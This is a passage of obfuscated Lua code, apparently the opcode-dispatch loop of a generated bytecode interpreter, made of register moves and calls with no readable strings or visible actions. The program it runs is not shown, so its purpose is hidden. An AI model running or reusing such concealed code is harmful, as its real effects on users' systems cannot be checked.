a==10 then n=n+1;else y=f[n];end else if a<=12 then w[y[616]]=w[y[222]][w[y[728]]];else if a<14 then n=n+1;else y=f[n];end end end else if a<=16 then if a==15 then i=y[616]else e={w[i](w[i+1])};end else if a<=17 then c=0;else if 18<a then break else for q=i,y[728]do c=c+1;w[q]=e[c];end end end end end end a=a+1 end end;elseif z<=306 then if z<=303 then if z<=301 then local a;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];a=y[616]w[a]=w[a](w[a+1])elseif z<303 then local a;local c;local e;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];e=y[616]c={w[e](w[e+1])};a=0;for i=e,y[728]do a=a+1;w[i]=c[a];end else local a;local c;local e;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];e=y[222];c=y[728];a=k(w,g,e,c);w[y[616]]=a;end;elseif 304>=z then w[y[616]][y[222]]=w[y[728]];elseif z==305 then local a;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=false;n=n+1;y=f[n];a=y[616]w[a](w[a+1])else local a;local c;local e;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];e=y[616]c={w[e](w[e+1])};a=0;for i=e,y[728]do a=a+1;w[i]=c[a];end end;elseif 309>=z then if(z==307 or z<307)then local a,c=0 while true do if a<=7 then if a<=3 then if(a==1 or a<1)then if(1>a)then c=nil else w[y[616]]=w[y[222]];end else if(2<a)then y=f[n];else n=(n+1);end end else if a<=5 then if a<5 then w[y[616]]=y[222];else n=n+1;end else if not(a~=6)then y=f[n];else w[y[616]]=y[222];end end end else if(a<11 or a==11)then if(a<9 or a==9)then if a>8 then y=f[n];else n=(n+1);end else if a>10 then n=n+1;else w[y[616]]=y[222];end end else if(a<=13)then if(a>12)then c=y[616]else y=f[n];end else if a>14 then break else w[c]=w[c](r(w,c+1,y[222]))end end end end a=a+1 end elseif(z>308)then j[y[222]]=w[y[616]];else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 1~=a then c=nil else w[y[616]]=w[y[222]][y[728]];end else if 2<a then y=f[n];else n=n+1;end end else if a<=5 then if a<5 then w[y[616]]=y[222];else n=n+1;end else if a>6 then w[y[616]]=y[222];else y=f[n];end end end else if a<=11 then if a<=9 then if 9~=a then n=n+1;else y=f[n];end else if a~=11 then w[y[616]]=y[222];else n=n+1;end end else if a<=13 then if 13>a then y=f[n];else c=y[616]end else if 14==a then w[c]=w[c](r(w,c+1,y[222]))else break end end end end a=a+1 end end;elseif 310>=z then local a;w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]][y[222]]=y[728];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];a=y[616]w[a]=w[a](r(w,a+1,y[222]))elseif 312>z then local a;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];a=y[616]w[a]=w[a](w[a+1])else local a;local c;local e;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];e=y[616]c={w[e](w[e+1])};a=0;for i=e,y[728]do a=a+1;w[i]=c[a];end end;elseif z<=324 then if 318>=z then if z<=315 then if z<=313 then local a;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];a=y[616];do return w[a](r(w,a+1,y[222]))end;n=n+1;y=f[n];a=y[616];do return r(w,a,p)end;elseif 314==z then local a;local c;local e;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];e=y[222];c=y[728];a=k(w,g,e,c);w[y[616]]=a;else local a;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];a=y[616]w[a]=w[a](r(w,a+1,y[222]))end;elseif z<=316 then local a;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];a=y[616]w[a]=w[a](r(w,a+1,y[222]))elseif z>317 then local a;local c;local e;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];e=y[616]c={w[e](w[e+1])};a=0;for g=e,y[728]do a=a+1;w[g]=c[a];end else if(w[y[616]]<=w[y[728]])then n=y[222];else n=n+1;end;end;elseif z<=321 then if 319>=z then local a;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];a=y[616]w[a]=w[a](r(w,a+1,y[222]))elseif 320<z then j[y[222]]=w[y[616]];else local a;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];a=y[616]w[a]=w[a](r(w,a+1,y[222]))end;elseif 322>=z then local a;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];a=y[616]w[a]=w[a](r(w,a+1,y[222]))elseif z<324 then local a;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];a=y[616]w[a](r(w,a+1,y[222]))else local a;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=false;n=n+1;y=f[n];a=y[616]w[a](w[a+1])end;elseif z<=330 then if 327>=z then if z<=325 then w[y[616]]=b(d[y[222]],nil,j);elseif z>326 then local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];a=y[616]w[a]=w[a](r(w,a+1,y[222]))else local a;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];a=y[616]w[a]=w[a](r(w,a+1,y[222]))end;elseif z<=328 then w[y[616]]=(w[y[222]]+w[y[728]]);elseif z==329 then local a;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];a=y[616]w[a]=w[a](r(w,a+1,y[222]))else local a;local c;w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]={r({},1,y[222])};n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];c=y[616];a=w[c];for e=c+1,y[222]do t(a,w[e])end;end;elseif 333>=z then if(331>z or 331==z)then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a>0 then w[y[616]]=j[y[222]];else c=nil end else if a<3 then n=n+1;else y=f[n];end end else if a<=5 then if a==4 then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if 7>a then y=f[n];else w[y[616]]=h[y[222]];end end end else if a<=11 then if a<=9 then if 9>a then n=n+1;else y=f[n];end else if a>10 then n=n+1;else w[y[616]]=w[y[222]][y[728]];end end else if a<=13 then if 13>a then y=f[n];else c=y[616]end else if a~=15 then w[c]=w[c](w[c+1])else break end end end end a=a+1 end elseif(332<z)then h[y[222]]=w[y[616]];else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a~=1 then c=nil else w[y[616]]=w[y[222]][y[728]];end else if a~=3 then n=n+1;else y=f[n];end end else if a<=5 then if a==4 then w[y[616]]=y[222];else n=n+1;end else if 6==a then y=f[n];else w[y[616]]=y[222];end end end else if a<=11 then if a<=9 then if a<9 then n=n+1;else y=f[n];end else if a>10 then n=n+1;else w[y[616]]=y[222];end end else if a<=13 then if a~=13 then y=f[n];else c=y[616]end else if a~=15 then w[c]=w[c](r(w,c+1,y[222]))else break end end end end a=a+1 end end;elseif z<=334 then w[y[616]]={r({},1,y[222])};elseif z==335 then local a=d[y[222]];local c={};local e={};for g=1,y[728]do n=n+1;local i=f[n];if i[523]==348 then e[g-1]={w,i[222]};else e[g-1]={h,i[222]};end;v[#v+1]=e;end;m(c,{['\95\95\105\110\100\101\120']=function(g,g)local g=e[g];return g[1][g[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(g,g,i)local e=e[g]e[1][e[2]]=i;end;});w[y[616]]=b(a,c,j);else w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];if w[y[616]]then n=n+1;else n=y[222];end;end;elseif z<=360 then if 348>=z then if z<=342 then if 339>=z then if z<=337 then local a=y[616]w[a]=w[a](r(w,a+1,p))elseif 338<z then local a=w[y[728]];if not a then n=n+1;else w[y[616]]=a;n=y[222];end;else local a=w[y[728]];if not a then n=n+1;else w[y[616]]=a;n=y[222];end;end;elseif z<=340 then local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if a~=1 then c=nil else w[y[616]]=w[y[222]][y[728]];end else if 3~=a then n=n+1;else y=f[n];end end else if a<=5 then if 4==a then w[y[616]]=h[y[222]];else n=n+1;end else if a<=6 then y=f[n];else if a>7 then n=n+1;else w[y[616]]=w[y[222]][w[y[728]]];end end end end else if a<=13 then if a<=10 then if a~=10 then y=f[n];else w[y[616]]=h[y[222]];end else if a<=11 then n=n+1;else if 12==a then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end else if a<=15 then if a==14 then n=n+1;else y=f[n];end else if a<=16 then c=y[616]else if 18~=a then w[c]=w[c](r(w,c+1,y[222]))else break end end end end end a=a+1 end elseif 342>z then w[y[616]][y[222]]=y[728];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];else w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];if(w[y[616]]~=w[y[728]])then n=n+1;else n=y[222];end;end;elseif z<=345 then if 343>=z then w[y[616]]=y[222];elseif 345>z then local a;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];a=y[616]w[a]=w[a](w[a+1])else w[y[616]]=w[y[222]];end;elseif z<=346 then local a=y[616]local c={w[a](r(w,a+1,y[222]))};local e=0;for g=a,y[728]do e=e+1;w[g]=c[e];end;elseif 347==z then local a;local c;local e;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];e=y[616]c={w[e](w[e+1])};a=0;for g=e,y[728]do a=a+1;w[g]=c[a];end else w[y[616]]=w[y[222]];end;elseif z<=354 then if z<=351 then if 349>=z then if(w[y[616]]~=y[728])then n=n+1;else n=y[222];end;elseif z~=351 then local a=y[616];local c=w[y[222]];w[a+1]=c;w[a]=c[y[728]];else local a;w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];a=y[616]w[a]=w[a]()end;elseif z<=352 then w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]]+y[728];n=n+1;y=f[n];h[y[222]]=w[y[616]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]();elseif z~=354 then local a;w[y[616]]=w[y[222]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];a=y[616]w[a]=w[a](r(w,a+1,y[222]))else w[y[616]]={};end;elseif z<=357 then if 355>=z then w[y[616]]=w[y[222]]%w[y[728]];elseif z==356 then local a;w[y[616]]=w[y[222]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];a=y[616]w[a]=w[a](r(w,a+1,y[222]))else w[y[616]]=b(d[y[222]],nil,j);end;elseif 358>=z then local a;local c;w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]={r({},1,y[222])};n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];c=y[616];a=w[c];for d=c+1,y[222]do t(a,w[d])end;elseif 360>z then local a=y[616];local c=w[y[222]];w[a+1]=c;w[a]=c[w[y[728]]];else w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];n=y[222];end;elseif z<=372 then if z<=366 then if 363>=z then if 361>=z then local a;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];a=y[616]w[a]=w[a](w[a+1])elseif 363>z then w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];if(w[y[616]]~=y[728])then n=n+1;else n=y[222];end;else w[y[616]]=w[y[222]]/y[728];end;elseif z<=364 then w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];if(w[y[616]]~=w[y[728]])then n=n+1;else n=y[222];end;elseif 366>z then w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];if w[y[616]]then n=n+1;else n=y[222];end;else local a;local c;w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]={r({},1,y[222])};n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];c=y[616];a=w[c];for d=c+1,y[222]do t(a,w[d])end;end;elseif 369>=z then if 367>=z then local a;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];a=y[616]w[a]=w[a](w[a+1])elseif z>368 then local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];a=y[616]w[a](w[a+1])else local a;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];a=y[616]w[a]=w[a]()end;elseif 370>=z then local a;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];a=y[616]w[a]=w[a](r(w,a+1,y[222]))elseif z~=372 then w[y[616]]={};else local a;local c;local d;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];d=y[616]c={w[d](w[d+1])};a=0;for e=d,y[728]do a=a+1;w[e]=c[a];end end;elseif z<=378 then if z<=375 then if z<=373 then w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];if w[y[616]]then n=n+1;else n=y[222];end;elseif 375>z then local a;local c;local d;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];d=y[616]c={w[d](w[d+1])};a=0;for e=d,y[728]do a=a+1;w[e]=c[a];end else local a=y[616]w[a]=w[a](r(w,a+1,p))end;elseif 376>=z then local a,c=0 while true do if a<=16 then if a<=7 then if a<=3 then if a<=1 then if 1~=a then c=nil else w[y[616]]=w[y[222]][y[728]];end else if a~=3 then n=n+1;else y=f[n];end end else if a<=5 then if 4<a then n=n+1;else w[y[616]]=h[y[222]];end else if 7>a then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end else if a<=11 then if a<=9 then if 8<a then y=f[n];else n=n+1;end else if a<11 then w[y[616]]={};else n=n+1;end end else if a<=13 then if 13~=a then y=f[n];else w[y[616]]=h[y[222]];end else if a<=14 then n=n+1;else if a~=16 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end end else if a<=24 then if a<=20 then if a<=18 then if a==17 then n=n+1;else y=f[n];end else if 19==a then w[y[616]]=h[y[222]];else n=n+1;end end else if a<=22 then if a~=22 then y=f[n];else w[y[616]]={};end else if 24>a then n=n+1;else y=f[n];end end end else if a<=28 then if a<=26 then if 25==a then w[y[616]]=h[y[222]];else n=n+1;end else if 27==a then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end else if a<=30 then if 30~=a then n=n+1;else y=f[n];end else if a<=31 then c=y[616]else if 33~=a then w[c]=w[c]()else break end end end end end end a=a+1 end elseif z<378 then w[y[616]]=y[222]*w[y[728]];else local a;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];a=y[616]w[a]=w[a](w[a+1])end;elseif z<=381 then if z<=379 then w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];for a=y[616],y[222],1 do w[a]=nil;end;elseif 380==z then local a;local c;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];c=y[616];a=w[c];for d=c+1,y[222]do t(a,w[d])end;else local a;local c;local d;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];d=y[616]c={w[d](w[d+1])};a=0;for e=d,y[728]do a=a+1;w[e]=c[a];end end;elseif z<=383 then if z<383 then local a;local c;local d;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];d=y[616]c={w[d](w[d+1])};a=0;for e=d,y[728]do a=a+1;w[e]=c[a];end else local a=y[616];local c=w[a];for d=a+1,p do t(c,w[d])end;end;elseif 385~=z then n=y[222];else w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];if(w[y[616]]~=y[728])then n=n+1;else n=y[222];end;end;n=n+1;end;end;end;return 